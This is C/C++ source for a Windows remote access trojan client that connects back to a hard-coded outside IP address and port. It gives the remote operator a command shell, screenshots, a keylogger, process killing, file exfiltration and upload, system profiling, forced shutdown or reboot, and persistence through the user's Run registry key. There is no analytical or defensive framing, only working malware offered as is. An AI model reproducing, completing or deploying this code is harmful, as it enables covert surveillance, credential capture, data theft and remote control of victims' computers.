#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <winsock2.h>
#include <windows.h>
#include <gdiplus.h>
#include <string.h>
#include <wingdi.h>
#include <iostream>
#include <sstream>
#include <conio.h>
#include <fstream>
#include <ctype.h>
#include <tlhelp32.h>
#include <stdint.h>
#include <direct.h>
#include <tchar.h>
#include <lmcons.h>
#include <UserEnv.h>
#include <userenv.h>
#include <winnt.h>
#include <versionhelpers.h>
#include <winbase.h>
#include <unistd.h>
#include <thread>

using namespace Gdiplus;
using namespace std;

#pragma comment(lib,"gdiplus.lib")
#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "kernel32.lib")

#define BUFFER_SIZE 8096
#define TRUE 1

SOCKET initSocket(const char* SERVER_IP, int PORT) {
    WSADATA wsaData;
    SOCKET clientSocket = INVALID_SOCKET;
    struct sockaddr_in serverAddress;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Failed to initialize Winsock.\n");
        return INVALID_SOCKET;
    }

    // Create socket
    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        printf("Failed to create socket.\n");
        WSACleanup();
        return INVALID_SOCKET;
    }

    // Prepare the server address structure
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = inet_addr(SERVER_IP);
    serverAddress.sin_port = htons(PORT);

    // Connect to the server
    if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        printf("Failed to connect to the server.\n");
        closesocket(clientSocket);
        WSACleanup();
        return INVALID_SOCKET;
    }

    printf("Connected to the server.\n");
    return clientSocket;
}

void sendData(SOCKET clientSocket, const char* buff)
{
	send(clientSocket, buff, strlen(buff), 0);
}

void recvData(SOCKET clientSocket, char* buff)
{
	recv(clientSocket, buff, BUFFER_SIZE, 0);
}

//----------------------------------------------------------------HELPER 
void redirectHelper(SOCKET clientSocket)
{
	const char* buff;
    buff =
        "Please choose one option below !\n"
        "cmd        execute command \n"
		"scr        screenshot \n"
		"lpc        list running processes \n"
		"kpc        kill a process \n"
		"df         download a file \n"
        "uf         upload a file \n"
        "klg        keylogger \n"
		"pw         power behaviour of client machine \n"
        "info      information about client machine \n"
		"exit       close the connection \n"
        "help       see all options available \n"
        ;

	sendData(clientSocket, buff);
}

void CMDHelper(SOCKET clientSocket)
{
	char buff[BUFFER_SIZE] = { 0 };

	sprintf(buff, "%s\n", \
		"quit		terminate CMD Worker" \
	);

	sendData(clientSocket, buff);
}

//---------------------------------------------------------------- CMD WORKER 
void handleCommand(SOCKET clientSocket) {
    char buffer[BUFFER_SIZE] = {0};

	while (1) {
        memset(buffer, 0, sizeof(buffer));
        ssize_t bytes_received = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytes_received <= 0) {
            break;
        }
		if (!strcmp(buffer, "QUIT")){
			sendData(clientSocket, "CMD Worker terminated!");
	 		break;
		}	
        if (strlen(buffer) > 0) {
			if (strncmp(buffer, "cd ", 3) == 0) {
        		// Extract the directory from the buffer
				char dir[PATH_MAX];
				if (sscanf(buffer + 3, "%s", dir) != 1) {
					perror("Invalid directory format");
					exit(1);
				}

				// Change directory for the program
				if (chdir(dir) == -1) {
					perror("Directory change failed");
					exit(1);
				}

				char cwd[PATH_MAX];
				if (getcwd(cwd, sizeof(cwd)) == NULL) {
					perror("getcwd error");
					exit(1);
				}

				char response[PATH_MAX + 64];
				snprintf(response, sizeof(response), "Current Directory: %s $", cwd);
				send(clientSocket, response, strlen(response), 0);
			}
			else{
				FILE *cmd_output = popen(buffer, "r");
				if (cmd_output == NULL) {
					perror("Command execution error");
					exit(1);
				}

				char output_str[1024];
				memset(output_str, 0, sizeof(output_str));
				fread(output_str, 1, sizeof(output_str) - 1, cmd_output);
				//pclose(cmd_output);

				char cwd[PATH_MAX];
				if (getcwd(cwd, sizeof(cwd)) == NULL) {
					perror("getcwd error");
					exit(1);
				}

				char response[BUFFER_SIZE + PATH_MAX];
				snprintf(response, sizeof(response), "%s\nCurrent Directory: %s $", output_str, cwd);
				send(clientSocket, response, strlen(response), 0);
			}
		}
	}
}


//---------------------------------------------------------------- SCREENSHOT
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	UINT  num = 0;          // number of image encoders
	UINT  size = 0;         // size of the image encoder array in bytes

	ImageCodecInfo* pImageCodecInfo = NULL;

	GetImageEncodersSize(&num, &size);
	if (size == 0)
		return -1;  // Failure

	pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
		return -1;  // Failure

	GetImageEncoders(num, size, pImageCodecInfo);

	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;  // Success
		}
	}

	free(pImageCodecInfo);
	return -1;  // Failure
}

void SCREENSHOTWorker(SOCKET clientSocket, char* pathSave)
{
	HDC hdcScreen = GetDC(NULL);
	HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
	HBITMAP hbmScreen = NULL;

	const size_t pathLength = strlen(pathSave) + 1;
	wchar_t* pathSaveWideChar = new wchar_t[pathLength];
	mbstowcs(pathSaveWideChar, pathSave, pathLength);

	GdiplusStartupInput gdip;
	ULONG_PTR gdipToken;
	GdiplusStartup(&gdipToken, &gdip, NULL);

	hbmScreen = CreateCompatibleBitmap(hdcScreen, 1718, 928);
	SelectObject(hdcMemDC, hbmScreen);

	BitBlt(hdcMemDC,0, 0, 1718, 928, hdcScreen, 0, 0, SRCCOPY);

	CLSID encoderID;

	GetEncoderClsid(L"image/png", &encoderID);

	Gdiplus::Bitmap* bmp = new Gdiplus::Bitmap(hbmScreen, (HPALETTE)0);
	bmp->Save(pathSaveWideChar, &encoderID, NULL);

	Gdiplus::GdiplusShutdown(gdipToken);
	DeleteObject(hbmScreen);
	DeleteObject(hdcMemDC);
	ReleaseDC(NULL, hdcScreen);

}

//----------------------------------------------------------------KEYLOGGER
#include "keylogger.h"


void Keylogger::startLogger(char* filePath)
{
	while (true)
	{
		logger(filePath);
		Sleep(10);
	}

}

std::string Keylogger::dumpKeys(char* filePath)
{
	std::ifstream stream(filePath);
	std::string keys((std::istreambuf_iterator<char>(stream)), std::istreambuf_iterator<char>());
	return keys;
}

void Keylogger::logger(char* filePath)		
{
	for (unsigned char c = 1; c < 255; c++) {
		SHORT rv = GetAsyncKeyState(c);
		if (rv & 1) { 
			std::string out = "";
			if (c == 1)
				out = "[LMOUSE]"; 
			else if (c == 2)
				out = "[RMOUSE]"; 
			else if (c == 4)
				out = "[MMOUSE]"; 
			else if (c == 13)
				out = "[RETURN]\n";
			else if (c == 16 || c == 17 || c == 18)
				out = "";
			else if (c == 160 || c == 161) 
				out = "[SHIFT]";
			else if (c == 162 || c == 163) 
				out = "[STRG]";
			else if (c == 164) 
				out = "[ALT]";
			else if (c == 165)
				out = "[ALT GR]";
			else if (c == 8)
				out = "[BACKSPACE]";
			else if (c == 9)
				out = "[TAB]";
			else if (c == 27)
				out = "[ESC]";
			else if (c == 33)
				out = "[PAGE UP]";
			else if (c == 34)
				out = "[PAGE DOWN]";
			else if (c == 35)
				out = "[HOME]";
			else if (c == 36)
				out = "[POS1]";
			else if (c == 37)
				out = "[ARROW LEFT]";
			else if (c == 38)
				out = "[ARROW UP]";
			else if (c == 39)
				out = "[ARROW RIGHT]";
			else if (c == 40)
				out = "[ARROW DOWN]";
			else if (c == 45)
				out = "[INS]";
			else if (c == 46)
				out = "[DEL]";
			else if ((c >= 65 && c <= 90)
				|| (c >= 48 && c <= 57)
				|| c == 32)
				out = c;

			else if (c == 91 || c == 92)
				out = "[WIN]";
			else if (c >= 96 && c <= 105)
				out = "[NUM " + std::to_string(c - 96) + "]";
			else if (c == 106)
				out = "[NUM /]";
			else if (c == 107)
				out = "[NUM +]";
			else if (c == 109)
				out = "[NUM -]";
			else if (c == 110)
				out = "[NUM ,]";
			else if (c >= 112 && c <= 123)
				out = "[F" + std::to_string(c - 111) + "]";
			else if (c == 144)
				out = "[NUM]";
			else if (c == 192)
				out = "[OE]";
			else if (c == 222)
				out = "[AE]";
			else if (c == 186)
				out = "[UE]";
			else if (c == 187)
				out = "+";
			else if (c == 188)
				out = ",";
			else if (c == 189)
				out = "-";
			else if (c == 190)
				out = ".";
			else if (c == 191)
				out = "#";
			else if (c == 226)
				out = "<";

			else
				out = "[KEY \\" + std::to_string(c) + "]";

			if (out != "")
			{
				std::ofstream file;
				file.open(filePath, std::ios_base::app);
				file << out;
				file.flush();
				file.close();
			}
		}
	}
}

//----------------------------------------------------------------LIST RUNNING PROCESS
void listProcesses(char* buffer, size_t buffer_size) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("Failed to create process snapshot\n");
        return;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &processEntry)) {
        printf("Failed to get first process entry\n");
        CloseHandle(snapshot);
        return;
    }

    snprintf(buffer, buffer_size, "PID\t\tName\n");
    strncat(buffer, "--------------------------------\n", buffer_size);

    do {
        char line[BUFFER_SIZE];
        snprintf(line, sizeof(line), "%lu\t\t%s\n", processEntry.th32ProcessID, processEntry.szExeFile);
        strncat(buffer, line, buffer_size);
    } while (Process32Next(snapshot, &processEntry));
    strncat(buffer, "List running processes sucessfully!", buffer_size);
    CloseHandle(snapshot);
}

//----------------------------------------------------------------KILL A PROCESS
void killProcess(SOCKET clientSocket) {
	char buff [BUFFER_SIZE];
	if (recv(clientSocket, buff, BUFFER_SIZE, 0)){
		DWORD pid = atoi(buff);

		HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
		if (hProcess == NULL) {
			perror("Failed to open process");
			return;
		}

		if (TerminateProcess(hProcess, 0)) {
			sendData(clientSocket, "Process terminated successfully.\n");
		} else {
			sendData(clientSocket, "Failed to terminate process");
		}
		CloseHandle(hProcess);
	}
	else {
		sendData(clientSocket, "Can't recieve PID");
	}
}

//----------------------------------------------------------------FILE DOWNLOAD FROM CLIENT TO SERVER
void sendFile(SOCKET clientSocket){
	char filePath[BUFFER_SIZE];
	recvData(clientSocket, filePath);

	FILE* file = fopen(filePath, "rb");
    if (file == NULL) {
        sendData(clientSocket, "Failed to open file!");
    }

	//send size file to server
	fseek(file, 0, SEEK_END);
    uint32_t lengthFile = ftell(file); 
    fseek(file, 0, SEEK_SET);
	uint32_t size = htonl(lengthFile);
    send(clientSocket, (char*)&size , sizeof(size), 0);

	//send data file to server
	char buffer[BUFFER_SIZE];
    int bytesRead, totalSent = 0;
    while (totalSent < lengthFile) {
        bytesRead = fread(buffer, 1, BUFFER_SIZE, file);
        if (bytesRead <= 0) {
			sendData(clientSocket, "Error reading file");
            break;
        }
        int bytesSent = send(clientSocket, buffer, bytesRead, 0);
        if (bytesSent <= 0) {
			sendData(clientSocket, "Error sending file");
            break;
        }
        totalSent += bytesRead;
    }
	fclose(file);
	file = NULL;
	memset(filePath, 0, BUFFER_SIZE);
	memset(buffer, 0, BUFFER_SIZE);
    sendData(clientSocket, "File transfer complete!");
}

//---------------------------------------------------------------- FILE UPLOAD FROM SERVER TO CLIENT
void receiveFile(SOCKET clientSocket) {
	// receive file path to save in client
	char filePath[BUFFER_SIZE];
	recvData(clientSocket, filePath);

    FILE* file = fopen(filePath, "wb+");
    if (!file) {
        sendData(clientSocket, "Failed to open file for writing.");
        return;
    }
	
	// receive size file from server
    uint32_t fileSize;
    recv(clientSocket, (char*)&fileSize, sizeof(fileSize), 0);
    fileSize = ntohl(fileSize);

	// receive data file from server
    char buffer[BUFFER_SIZE];
    int bytesReceived = 0;

    while (bytesReceived < fileSize) {
        int bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesRead <= 0) {
            break;
        }
        fwrite(buffer, 1, bytesRead, file);
        bytesReceived += bytesRead;
    }

    fclose(file);
	file = NULL;
	memset(filePath, 0, BUFFER_SIZE);
	memset(buffer, 0, BUFFER_SIZE);
    sendData(clientSocket, "File received successfully.");
}

//----------------------------------------------------------------INFO
void getVersionInfo(char* buff)
{
	OSVERSIONINFOEXA versionInfo;
	SYSTEM_INFO systemInfo;

	versionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);

	GetSystemInfo(&systemInfo);
	GetVersionExA((OSVERSIONINFOA*)&versionInfo);
	if (versionInfo.dwMajorVersion == 10)
	{
		if (versionInfo.wProductType == VER_NT_WORKSTATION)
			strcpy(buff, "Windows 10");
		else
			strcpy(buff, "Windows Server 2016");
	}
	else if (versionInfo.dwMajorVersion == 6)
	{
		if (versionInfo.dwMinorVersion == 3)
		{
			if (versionInfo.wProductType == VER_NT_WORKSTATION)
				strcpy(buff, "Windows 8.1");
			else
				strcpy(buff, "Windows Server 2012 R2");
		}
		else if (versionInfo.dwMinorVersion == 2)
		{
			if (versionInfo.wProductType == VER_NT_WORKSTATION)
				strcpy(buff, "Windows 8");
			else
				strcpy(buff, "Windows Server 2012");
		}
		else if (versionInfo.dwMinorVersion == 1)
		{
			if (versionInfo.wProductType == VER_NT_WORKSTATION)
				strcpy(buff, "Windows 7");
			else
				strcpy(buff, "Windows Server 2008 R2");
		}
		else if (versionInfo.dwMinorVersion == 0)
		{
			if (versionInfo.wProductType == VER_NT_WORKSTATION)
				strcpy(buff, "Windows Vista");
			else
				strcpy(buff, "Windows Server 2008");
		}
	}
	else if (versionInfo.dwMajorVersion == 5)
	{
		if (versionInfo.dwMinorVersion == 2)
		{
			if (GetSystemMetrics(SM_SERVERR2) != 0)
				strcpy(buff, "Windows Server 2003 R2");
			else
				strcpy(buff, "Windows Server 2003");
			if (versionInfo.wSuiteMask & VER_SUITE_WH_SERVER)
				strcpy(buff, "Windows Home Server");
			if ((versionInfo.wProductType == VER_NT_WORKSTATION) && (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64))
				strcpy(buff, "Windows XP Professional x64 Edition");
		}
		else if (versionInfo.dwMinorVersion == 1)
			strcpy(buff, "Windows XP");
		else if (versionInfo.dwMinorVersion == 0)
			strcpy(buff, "Windows 2000");
	}
}

void getMemoryStatus(char* buff)
{
	MEMORYSTATUS memoryStatus;
	char temp[BUFFER_SIZE] = { 0 };

	memoryStatus.dwLength = sizeof(MEMORYSTATUS);

	GlobalMemoryStatus(&memoryStatus);
	sprintf(buff, "\nPercentage of physical memory that is in use: %d", memoryStatus.dwMemoryLoad);

	strcat(buff, "\nAmount of actual physical memory, in bytes: ");
	sprintf(temp, "%d", memoryStatus.dwTotalPhys);
	strcat(buff, temp);

	strcat(buff, "\nAmount of physical memory currently available, in bytes: ");
	sprintf(temp, "%d", memoryStatus.dwAvailPhys);
	strcat(buff, temp);
}

void infoComputer(SOCKET sock)
{
	char buff[BUFFER_SIZE] = { 0 };

	LASTINPUTINFO lastInputInfo;
	ULONGLONG tickCount;
	LANGID langID;
	char temp[BUFFER_SIZE] = { 0 };
	DWORD size = sizeof(temp);

	lastInputInfo.cbSize = sizeof(LASTINPUTINFO);

	GetComputerNameA(temp, &size);
	sprintf(buff, "\nComputer name: %s", temp);

	GetUserNameA(temp, &size);
	strcat(buff, "\nUser name: ");
	strcat(buff, temp);

	GetLastInputInfo(&lastInputInfo);
	sprintf(temp, "%d", lastInputInfo.dwTime);
	strcat(buff, "\nTime of last input event: ");
	strcat(buff, temp);

	tickCount = GetTickCount();
	sprintf(temp, "%d", tickCount);
	strcat(buff, "\nTime since system started: ");
	strcat(buff, temp);

	getVersionInfo(temp);
	strcat(buff, "\nVersion of Windows: ");
	strcat(buff, temp);

	strcat(buff, "\nLocale: ");
	GetLocaleInfoA(LOCALE_USER_DEFAULT, LOCALE_SISO639LANGNAME, temp, BUFFER_SIZE);
	strcat(buff, temp);
	strcat(buff, "_");
	GetLocaleInfoA(LOCALE_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, temp, BUFFER_SIZE);
	strcat(buff, temp);

	getMemoryStatus(temp);
	strcat(buff, temp);

	langID = GetUserDefaultLangID();
	sprintf(temp, "%d", langID);
	strcat(buff, "LangID: ");
	strcat(buff, temp);

	sendData(sock, buff);
}

//----------------------------------------------------------------COMPUTER POWER 
int powerComputer(SOCKET sock)
{
	HANDLE hProcess, hToken;
	TOKEN_PRIVILEGES tokenPrivileges;
	int type;
	char buff[BUFFER_SIZE] = { 0 };
	while (recv(sock, buff, BUFFER_SIZE, 0))
	{
		type = atoi(buff);
		if (type == 0)
		{
			LockWorkStation();
			return 0;
		}
		else if (type == 1)
		{
			ExitWindowsEx(EWX_LOGOFF, 0);
			return 0;
		}

		hProcess = GetCurrentProcess();
		OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken);
		LookupPrivilegeValue(0, SE_SHUTDOWN_NAME, &tokenPrivileges.Privileges[0].Luid);

		tokenPrivileges.PrivilegeCount = 1;
		tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		AdjustTokenPrivileges(hToken, 0, &tokenPrivileges, 0, 0, 0);
		if (type == 2)
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_MINOR_UPGRADE | SHTDN_REASON_FLAG_PLANNED);
		else if (type == 3)
			ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_MINOR_UPGRADE | SHTDN_REASON_FLAG_PLANNED);
		else if (type == 4)
			ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_MINOR_UPGRADE | SHTDN_REASON_FLAG_PLANNED);

	}
	return 0;
}

//----------------------------------------------------------------ADD CLIENT.EXE TO REGISTRY AUTORUN 
BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName){
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwRegType = REG_SZ;
    wchar_t szPathToExe[MAX_PATH]  = {};
    DWORD dwSize = sizeof(szPathToExe);

    lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        lResult = RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
        fSuccess = (lResult == 0);
    }

    if (fSuccess)
    {
        fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args){
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;

    const size_t count = MAX_PATH*2;
    wchar_t szValue[count] = {};


    wcscpy_s(szValue, count, L"\"");
    wcscat_s(szValue, count, pathToExe);
    wcscat_s(szValue, count, L"\" ");

    if (args != NULL)
    {
        wcscat_s(szValue, count, args);
    }

    lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        dwSize = (wcslen(szValue)+1)*2;
        lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

void RegisterProgram(){
    wchar_t szPathToExe[MAX_PATH] = L"C:\\Users\\new\\Desktop\\client.exe";

    GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
    RegisterMyProgramForStartup(L"MyClient", szPathToExe, L"-foobar");
}

int clientStartup(){
    RegisterProgram();
    IsMyProgramRegisteredForStartup(L"MyClient");
    return 0;
}

//----------------------------------------------------------------REDIRECT
void redirectCmd(SOCKET clientSocket, char* pathSaveScreenshot, char* pathSaveKeyLogger)
{
	char buff[BUFFER_SIZE] = { 0 };

	while (recv(clientSocket, buff, BUFFER_SIZE, 0))
	{
		if (!strcmp(buff, "HELP"))
			redirectHelper(clientSocket);
		else if (!strcmp(buff, "CMD"))
		{
            sendData(clientSocket, "CMD is started! Type 'quit' if you don't want to work with cmd anymore.");
            handleCommand(clientSocket);
		}
		else if (!strcmp(buff, "SCR"))
		{
			SCREENSHOTWorker(clientSocket, pathSaveScreenshot);
			sendData(clientSocket, "Screenshot success! Save at C:\\screenshot.png in client machine");
		}
		else if (!strcmp(buff, "KLG")){
			Keylogger::startLogger(pathSaveKeyLogger);
			sendData(clientSocket, "keyLogger start listening and save at C:\\keylogger.txt");
		}
		else if (!strcmp(buff, "LPC")){
			char buffer[BUFFER_SIZE];
			listProcesses(buffer, sizeof(buffer));

			if (send(clientSocket, buffer, strlen(buffer), 0) < 0) {
				perror("Sending data failed");
    		}
            sendData(clientSocket, "List running processes successfully!");
		}
		else if (!strcmp(buff, "KPC")){
			killProcess(clientSocket);
		}
		else if (!strcmp(buff, "DF")){
			sendFile(clientSocket);
		}
        else if (!strcmp(buff, "UF")){
            receiveFile(clientSocket);
        }
		else if (!strcmp(buff, "EXIT")){
			closesocket(clientSocket);
            break;
		}
		else if (!strcmp(buff, "PW")){
            powerComputer(clientSocket);
            sendData(clientSocket, "Success!");
        }
        else if (!strcmp(buff, "INFO")){
            infoComputer(clientSocket);
        }

		memset(buff, 0, BUFFER_SIZE);
	}
}



int main(){
    char HOST[] = "18.167.99.46", pathSaveScreenshot[] = "C:\\screenshot.png", pathSaveKeyLogger[] = "C:\\keylogger.txt";
    int PORT = 8008;
	while (true){
		SOCKET clientSocket;
    	clientSocket = initSocket(HOST, PORT);

		clientStartup();

		if (clientSocket == INVALID_SOCKET) {
			printf("Failed to initialize the socket.\n");
			Sleep(5000);
			continue;
		}

		const char* banner = 
			" ██████╗  ██████╗ ██████╗ ███████╗██╗   ██╗███████╗\n"
			"██╔════╝ ██╔═══██╗██╔══██╗██╔════╝╚██╗ ██╔╝██╔════╝\n"
			"██║  ███╗██║   ██║██║  ██║█████╗   ╚████╔╝ █████╗  \n"
			"██║   ██║██║   ██║██║  ██║██╔══╝    ╚██╔╝  ██╔══╝  \n"
			"╚██████╔╝╚██████╔╝██████╔╝███████╗   ██║   ███████╗\n"
			" ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝\n"
			"\n"
			"Please choose one option below !\n"
			"cmd        execute command \n"
			"scr        screenshot \n"
			"lpc        list running processes \n"
			"kpc        kill a process \n"
			"df         download a file \n"
			"uf         upload a file \n"
			"klg        keylogger \n"
			"pw         power behaviour of client machine \n"
			"info       information about client machine \n"
			"exit       close the connection \n"
			"help       see all options available \n"
			;

		sendData(clientSocket, banner);

		redirectCmd(clientSocket, pathSaveScreenshot, pathSaveKeyLogger);

		closesocket(clientSocket);
		WSACleanup();
		Sleep(500);
	}
    return EXIT_SUCCESS;
}

